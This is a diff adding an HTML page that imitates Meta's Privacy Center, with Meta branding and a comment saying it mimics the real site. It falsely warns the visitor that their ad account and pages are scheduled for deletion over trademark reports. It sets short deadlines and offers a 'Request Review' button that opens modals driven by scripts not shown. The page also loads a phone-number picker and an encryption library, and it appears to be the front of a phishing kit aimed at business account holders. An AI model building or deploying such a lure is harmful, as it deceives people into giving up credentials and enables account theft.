@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy Center - Request review</title>
+    <link rel="icon" href="./public/favicon-32x32.png">
+    <link rel="stylesheet" href="./public/styles/style.css">
+    <!-- Intl-Tel-Input CSS for phone code selector -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@19.5.6/build/css/intlTelInput.css">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#1877f2',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+    
+</head>
+
+<body class="bg-[#f6f7f9] min-h-screen w-full">
+    <div class="max-w-5xl mx-auto px-4 py-6 w-full">
+        <div class="flex gap-6">
+            <!-- Sidebar (mimic BusinessSupport Privacy Center) -->
+            <aside class="w-64 hidden md:block">
+                <div class="rounded-lg border bg-white shadow-sm">
+                    <div class="px-4 py-3 border-b">
+                        <div class="flex items-center gap-2">
+                            <img src="./public/meta/logo-fa.svg" alt="Meta" class="w-5 h-5" data-i18n-attr="alt:img_meta_alt">
+                            <span class="font-semibold text-sm" data-i18n="sidebar_title">Privacy Center</span>
+                        </div>
+                    </div>
+                    <nav class="p-2 space-y-1 text-sm">
+                        <a class="flex items-center gap-2 px-3 py-2 rounded-md bg-gray-100 font-medium" href="#">
+                            <img src="./public/meta/home.svg" class="w-4 h-4" alt="home">
+                            <span data-i18n="nav_home">Privacy Center | Home Page</span>
+                        </a>
+                        <a class="flex items-center gap-2 px-3 py-2 rounded-md hover:bg-gray-50" href="#">
+                            <img src="./public/meta/search.svg" class="w-4 h-4" alt="search">
+                            <span data-i18n="nav_search">Search</span>
+                        </a>
+                        <a class="flex items-center gap-2 px-3 py-2 rounded-md hover:bg-gray-50" href="#">
+                            <img src="./public/meta/lock.svg" class="w-4 h-4" alt="policy">
+                            <span data-i18n="nav_policy">Privacy Policy</span>
+                        </a>
+                        <a class="flex items-center gap-2 px-3 py-2 rounded-md hover:bg-gray-50" href="#">
+                            <img src="./public/meta/tool.svg" class="w-4 h-4" alt="rules">
+                            <span data-i18n="nav_rules">Other rules and articles</span>
+                        </a>
+                        <a class="flex items-center gap-2 px-3 py-2 rounded-md hover:bg-gray-50" href="#">
+                            <img src="./public/meta/more.svg" class="w-4 h-4" alt="settings">
+                            <span data-i18n="nav_settings">Settings</span>
+                        </a>
+                    </nav>
+                </div>
+            </aside>
+
+            <!-- Main content -->
+            <main class="flex-1">
+                <div class="rounded-lg border bg-white shadow-sm">
+                    <div class="px-5 pt-5">
+                        <div class="flex items-center gap-2 text-gray-600 text-sm mb-2">
+                            <img src="./public/meta/logo-fa.svg" alt="Meta" class="w-5 h-5" data-i18n-attr="alt:img_meta_alt">
+                            <span>Meta</span>
+                        </div>
+                        <h1 class="text-xl font-semibold mb-2" data-i18n="headline">We have scheduled your ad account and pages for deletion</h1>
+                        <p class="text-sm text-gray-700 mb-2" data-i18n="p1">We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.</p>
+                        <p class="text-sm text-gray-700 mb-4" data-i18n="p2">If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.</p>
+                    </div>
+
+                    <div class="px-5 pb-6">
+                        <div class="pc-illustration">
+                            <img src="./public/logo-center.png" alt="Security Illustration" data-i18n-img="hero_security" data-i18n-attr="alt:img_security_alt">
+                            <div class="pc-request">
+                                <div class="font-semibold text-sm mb-1" data-i18n="req_title">Request review</div>
+                                <p class="text-sm text-gray-700" data-i18n="req_desc">This form is only to be used for submitting appeals and restoring account status</p>
+                                <p class="text-xs text-gray-500 mt-2" data-i18n="req_note">In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</p>
+                            </div>
+                            <!-- Keep existing IDs to preserve JS flow -->
+                            <button id="submitRequestBtn" class="pc-primary-btn mt-3" data-i18n="btn_request">Request Review</button>
+                            <div class="ticket"><span data-i18n="ticket_label">Your ticket id:</span> #<span id="ticketId">XXXX-XXXX-XXXX</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Footer links -->
+                <div class="flex items-center text-center justify-center flex-wrap text-xs mt-6 text-[#65676b] gap-4">
+                    <a href="#" data-i18n="footer_help">Help Center</a>
+                    <a href="#" data-i18n="footer_policy">Privacy Policy</a>
+                    <a href="#" data-i18n="footer_terms">Terms of Service</a>
+                    <a href="#" data-i18n="footer_community">Community Standards</a>
+                    <a href="#">Meta © 2025</a>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
+
+    <!-- JavaScript Files -->
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <!-- Intl-Tel-Input JS for phone code selector -->
+    <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@19.5.6/build/js/intlTelInput.min.js"></script>
+    <script src="./public/i18n/locales.js"></script>
+    <script src="./public/i18n/assets.js"></script>
+    <script src="./public/i18n/locales_ext.js"></script>
+    <script src="./public/js/i18n.js"></script>
+    <script src="./public/js/app.js"></script>
+</body>
+
+</html>
